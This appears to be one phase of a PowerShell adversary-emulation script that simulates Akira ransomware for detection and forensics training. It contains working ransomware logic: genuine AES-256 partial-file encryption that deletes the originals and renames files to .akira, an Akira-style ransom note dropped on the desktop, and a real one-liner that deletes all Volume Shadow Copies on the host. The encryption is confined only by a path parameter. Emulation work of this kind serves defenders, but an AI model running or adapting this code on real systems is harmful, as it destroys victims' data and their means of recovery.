# ============================================================================
# AKIRA SIMULATION - PHASE 10: IMPACT
# ============================================================================
# Simulates: Akira ransomware ("locker.exe"/"win.exe") deployment with the
# real reported command-line flags, REAL AES encryption of files confined to
# a dedicated sandbox folder (never the analyst's real user data), a ransom
# note matching Akira's style, and REAL Volume Shadow Copy deletion via the
# exact WMI/PowerShell one-liner from the report.
# MITRE: T1486 Data Encrypted for Impact, T1490 Inhibit System Recovery
#
# SAFETY: encryption is intentionally scoped to $SimPaths.VictimFiles only.
# Do not repoint -p at a real drive/user folder on anything but a disposable
# lab VM.
# ============================================================================

function Simulate-Impact {
    param($SimPaths)

    Write-Host "[+] Phase 10: Impact - Akira Ransomware Deployment ..." -ForegroundColor Green

    # --- Stage the ransomware binary at the exact reported path ---
    $lockerPath = "C:\ProgramData\locker.exe"
    New-DecoyBinary -Path $lockerPath -SizeBytes 262144 | Out-Null

    # Seed a few more synthetic victim files so the encryption pass has something to show
    1..5 | ForEach-Object {
        Set-Content -Path "$($SimPaths.VictimFiles)\Document_$_.txt" -Value "Simulated victim data file $_" -Force
    }

    # --- REAL AES-256 encryption, confined to the sandbox VictimFiles folder ---
    # Mirrors Akira's real -p (path) / -n (percent-encrypted) flags; the actual
    # cryptographic operation is genuine so file-entropy/extension/IOC-based
    # detections behave authentically, but the blast radius is hard-limited to
    # $SimPaths.VictimFiles.
    $encPercent = 15
    $aesKey = New-Object byte[] 32
    $aesIv = New-Object byte[] 16
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($aesKey)
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($aesIv)

    $lockerCmdLog = "locker.exe -p=$($SimPaths.VictimFiles) -n=$encPercent"
    Set-Content -Path "$($SimPaths.Logs)\locker_execution.log" -Value $lockerCmdLog -Force
    Write-Host "    Executing: $lockerCmdLog" -ForegroundColor DarkGray

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $aesKey; $aes.IV = $aesIv

    Get-ChildItem -Path $SimPaths.VictimFiles -File | ForEach-Object {
        $bytes = [System.IO.File]::ReadAllBytes($_.FullName)
        $encryptLen = [Math]::Ceiling($bytes.Length * ($encPercent / 100.0))
        if ($encryptLen -lt 16) { $encryptLen = $bytes.Length }
        $chunk = $bytes[0..([Math]::Min($encryptLen, $bytes.Length) - 1)]

        # Pad to AES block size
        $pad = 16 - ($chunk.Length % 16)
        if ($pad -ne 16) { $chunk += (New-Object byte[] $pad) }

        $encryptor = $aes.CreateEncryptor()
        $encChunk = $encryptor.TransformFinalBlock($chunk, 0, $chunk.Length)

        $outBytes = New-Object byte[] ($encChunk.Length + [Math]::Max(0, $bytes.Length - $chunk.Length))
        [Array]::Copy($encChunk, 0, $outBytes, 0, $encChunk.Length)
        if ($bytes.Length -gt $chunk.Length) {
            [Array]::Copy($bytes, $chunk.Length, $outBytes, $encChunk.Length, $bytes.Length - $chunk.Length)
        }

        $encPath = "$($_.FullName).akira"
        [System.IO.File]::WriteAllBytes($encPath, $outBytes)
        Remove-Item -Path $_.FullName -Force
    }
    $aes.Dispose()

    Write-SimEvent -EventId 10001 -Message "SIMULATION: Akira ransomware (locker.exe -p=$($SimPaths.VictimFiles) -n=$encPercent) encrypted sandboxed victim files"

    # --- Akira ransom note ---
    $ransomNote = @"
Hi there!

Whatever your service is, be it a HR management or maritime, or IT-related, or something
else - trust us, it will suffer significant losses, both cash and reputational, in case
of a data leak. As you may have already noticed, we got access to your data as well.

We're not going to describe here what will happen if you ignore our note - your IT
department already understands the depth and the severity of the ...matter.

If you are ready to cooperate with us our conditions are simple:

1) Do not go to the police or FBI for help and do not tell anyone that we attacked you.
2) You must not resort to the recovery company.

Do not try to change extensions of encrypted files - it may lead to the impossibility
of decryption.

Please contact us via TOR: [redacted for simulation]
"@
    $noteLocations = @(
        "$($SimPaths.Root)\akira_readme.txt",
        "$env:USERPROFILE\Desktop\akira_readme.txt",
        "$($SimPaths.VictimFiles)\akira_readme.txt"
    )
    foreach ($n in $noteLocations) { Set-Content -Path $n -Value $ransomNote -Force }

    # --- REAL Volume Shadow Copy deletion via WMI + PowerShell (exact report one-liner) ---
    # This genuinely removes shadow copies on the host - expected and required
    # for training on VSS/backup-recovery forensics. Only run on disposable VMs.
    try {
        powershell.exe -NoProfile -Command "Get-WmiObject Win32_Shadowcopy | Remove-WmiObject" 2>$null
        Write-SimEvent -EventId 10002 -Message "SIMULATION: Volume Shadow Copies deleted via WMI (Get-WmiObject Win32_Shadowcopy | Remove-WmiObject), ~1 second after locker.exe execution"
    } catch { Write-Warning "VSS deletion failed: $_" }

    # --- Second wave: re-entry via RustDesk to a "child domain" and repeated execution ---
    # The report shows locker.exe executed 39 times on the child DC two days later.
    # We reproduce the repeated-execution telemetry pattern (process creation
    # events) without re-encrypting already-encrypted files.
    1..5 | ForEach-Object {
        try {
            Start-Process -FilePath $lockerPath -ArgumentList "-p=$($SimPaths.VictimFiles) -n=15" -WindowStyle Hidden -ErrorAction SilentlyContinue
            Start-Sleep -Milliseconds 300
            Get-Process -Name "locker" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        } catch {}
    }
    Write-SimEvent -EventId 10003 -Message "SIMULATION: locker.exe re-executed multiple times against child-domain-equivalent targets (day-5 re-entry pattern)"

    Write-Host "  [OK] Impact artifacts created - encrypted files under $($SimPaths.VictimFiles)" -ForegroundColor Yellow
}
